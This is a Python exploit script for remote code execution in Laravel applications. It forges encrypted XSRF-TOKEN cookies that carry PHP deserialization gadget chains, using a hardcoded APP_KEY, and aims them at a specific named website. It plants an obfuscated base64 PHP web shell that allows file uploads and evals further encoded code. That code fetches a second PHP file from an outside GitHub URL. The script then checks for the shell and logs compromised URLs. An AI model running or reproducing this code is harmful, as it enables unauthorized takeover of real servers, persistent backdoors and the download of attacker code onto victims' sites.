# -*- coding: utf-8 -*-
''' So many people who love you. Don't focus on the people who don't. xD '''

import hmac, hashlib, json, requests, re, threading, time, random, sys, os
requests.packages.urllib3.disable_warnings()
from hashlib import sha256
from base64 import b64decode
from base64 import b64encode
from Crypto import Random
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from pwn import *
import bs4 as BeautifulSoup
# Payload configure
p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/Chitoge.php", "w") or die("Unable to open file!"); $code = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwoKaWYoaXNzZXQoJF9HRVRbIkNoaXRvZ2UiXSkpIHsKICAgIGVjaG8gIjxoMT48aT5DaGl0b2dlIGtpcmlzYWtpIDwzPC9pPjwvaDE+PGJyPiI7CiAgICBlY2hvICI8Yj48cGhwdW5hbWU+Ii5waHBfdW5hbWUoKS4iPC9waHB1bmFtZT48L2I+PGJyPiI7CiAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgogICAgICAgICAgPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2lkeF9maWxlJz4KICAgICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3VwbG9hZCcgdmFsdWU9J3VwbG9hZCc+CiAgICAgICAgICA8L2Zvcm0+IjsKICAgICRyb290ID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICAgICRmaWxlcyA9ICRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXTsKICAgICRkZXN0ID0gJHJvb3QuJy8nLiRmaWxlczsKICAgIGlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7CiAgICAgICAgaWYoaXNfd3JpdGFibGUoJHJvb3QpKSB7CiAgICAgICAgICAgIGlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRkZXN0KSkgewogICAgICAgICAgICAgICAgJHdlYiA9ICJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ107CiAgICAgICAgICAgICAgICBlY2hvICJTdWtzZXMgLT4gPGEgaHJlZj0nJHdlYi8kZmlsZXMnIHRhcmdldD0nX2JsYW5rJz48Yj48dT4kd2ViLyRmaWxlczwvdT48L2I+PC9hPiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICJnYWdhbCB1cGxvYWQgZGkgZG9jdW1lbnQgcm9vdC4iOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJGZpbGVzKSkgewogICAgICAgICAgICAgICAgZWNobyAic3Vrc2VzIHVwbG9hZCA8Yj4kZmlsZXM8L2I+IGRpIGZvbGRlciBpbmkiOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAiZ2FnYWwgdXBsb2FkIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfSBlbHNlaWYoaXNzZXQoJF9HRVRbIktpcmlzYWtpIl0pKXsKCSRob21lZSA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CgkkY2dmcyA9IGV4cGxvZGUoIi8iLCRob21lZSk7CgkkYnVpbGQgPSAnLycuJGNnZnNbMV0uJy8nLiRjZ2ZzWzJdLicvLmNhZ2Vmcyc7CglpZihpc19kaXIoJGJ1aWxkKSkgewoJCWVjaG8oIkNsb3VkTGludXggPT4gVHJ1ZSIpOwoJfSBlbHNlIHsKCQllY2hvKCJDbG91ZExpbnV4ID0+IEZhbHNlIik7Cgl9Cn0gZWxzZWlmIChpc3NldCgkX0dFVFsnR29yaWxhJ10pKSB7CglldmFsKGJhc2U2NF9kZWNvZGUoJ1puVnVZM1JwYjI0Z1lXUnRhVzVsY2lna2RYSnNMQ0FrYVhOcEtTQjdDaUFnSUNBZ0lDQWdKR1p3SUQwZ1ptOXdaVzRvSkdsemFTd2dJbmNpS1RzS0lDQWdJQ0FnSUNBa1kyZ2dQU0JqZFhKc1gybHVhWFFvS1RzS0lDQWdJQ0FnSUNCamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmVlZKTUxDQWtkWEpzS1RzS0lDQWdJQ0FnSUNCamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmUWtsT1FWSlpWRkpCVGxOR1JWSXNJSFJ5ZFdVcE93b2dJQ0FnSUNBZ0lHTjFjbXhmYzJWMGIzQjBLQ1JqYUN3Z1ExVlNURTlRVkY5U1JWUlZVazVVVWtGT1UwWkZVaXdnZEhKMVpTazdDaUFnSUNBZ0lDQWdZM1Z5YkY5elpYUnZjSFFvSkdOb0xDQkRWVkpNVDFCVVgxTlRURjlXUlZKSlJsbFFSVVZTTENCbVlXeHpaU2s3Q2lBZ0lDQWdJQ0FnWTNWeWJGOXpaWFJ2Y0hRb0pHTm9MQ0JEVlZKTVQxQlVYMFpKVEVVc0lDUm1jQ2s3Q2lBZ0lDQWdJQ0FnY21WMGRYSnVJR04xY214ZlpYaGxZeWdrWTJncE93b2dJQ0FnSUNBZ0lHTjFjbXhmWTJ4dmMyVW9KR05vS1RzS0lDQWdJQ0FnSUNCbVkyeHZjMlVvSkdad0tUc0tJQ0FnSUNBZ0lDQnZZbDltYkhWemFDZ3BPd29nSUNBZ0lDQWdJR1pzZFhOb0tDazdDbjBLYVdZb1lXUnRhVzVsY2lnbmFIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDJGdVpISnZlR2RvTUhOMEwycDFjM1F0Wm05eUxXWjFiaTl0WVhOMFpYSXZkM0F1Y0dod0p5d25kM0F1Y0dod0p5a3BJSHNLSUNBZ0lDQWdJQ0JsWTJodklDSjNhV0oxYUdWclpYSXViM0puSWpzS2ZTQmxiSE5sSUhzS0lDQWdJQ0FnSUNCbFkyaHZJQ0pzYjJOaGJHaHZjM1FpT3dwOScpKTsKfSBlbHNlIHsKICAgIGhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwp9Cj8+"; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("Chitoge kirisaki?! Tsundere,kawaii <3"); ?>'

# Preparing
BLOCK_SIZE = 16
api_key = "R+pImoQmMy2nXx66rBiAqNK6nUXye7S7Wo/4DnPxMg0="

def encrypt(raw, key):
	cipher = AES.new(key, AES.MODE_CBC)
	value = cipher.encrypt(pad(base64.b64decode(raw), AES.block_size))
	payload = base64.b64encode(value)
	iv_base64 = base64.b64encode(cipher.iv)
	hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
	iv_base64 = iv_base64.decode("utf-8")
	payload = payload.decode("utf-8")
	data = {"iv": iv_base64, "value": payload, "mac": hashed_mac}
	json_data = json.dumps(data)
	payload_encoded = base64.b64encode(json_data.encode()).decode("utf-8")
	return  json_data


def generatePayload(command, key, method):
	def switchMethod(method):
		switcher = {
			1: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(command)) + ':"' + command + '";}'),
			2: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(command)) + ':"' + command + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(command)) + ':"' + command + '";}'),
			3: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(command)) + ':"' + command + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'),
			4: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(command)) + ':"' + command + '";}'),
			# 5: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(command) + 15) + ':"<?php ' + command + ' exit; ?>";}}}')
		}
		return switcher.get(method, "Invalid method")

	payloadRCE = switchMethod(method)
	payloadBase64 = base64.b64encode(payloadRCE.encode()).decode("utf-8")
	plainTextKey = base64.b64decode(key)
	return encrypt(payloadBase64, plainTextKey)

def exploit(payload, url):
	asu = url
	resp = False
	text = '\033[32;1m#\033[0m '+url
	headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
	cokk = {"XSRF-TOKEN": payload}
	curler = requests.get(url+'/public/', cookies=cokk, verify=False, timeout=8, headers=headers).text
	y = curler.split("</html>")[1]
	cekshell = requests.get(url + '/Chitoge.php?Chitoge', verify=False, timeout=8, headers=headers).text
	if 'Chitoge kirisaki' in cekshell:
		text += " | Success"
		save = open('shell_results.txt','a')
		save.write(url + '/Chitoge.php?Chitoge\n')
		save.close()
	else:
		text += " | Can't exploit"

	print(text)


def sendPayloadCommand(payload, url):
	cookies = {"X-XSRF-TOKEN": payload}
	try:
		print(payload)
		l = log.progress('Sending command')
		l.status('...')
		r = requests.post(url=url, cookies=cookies)
		print(r.text)
		soup = BeautifulSoup(r.text.split("</html>")[1], "lxml")
		text = soup.get_text()
		time.sleep(1)
		l.success("Done")
		print(text.rstrip())
	except Exception as e:
		log.failure("Error: "+str(e))
		log.warning(
			"Make sure URL and APP_KEY are the correct ones and host is reachable. See help (-h)")


payload = generatePayload('uname -a', api_key, 1)
exploit(payload, "http://myfreecams-models.com/")
#exploit("http://myfreecams-models.com/")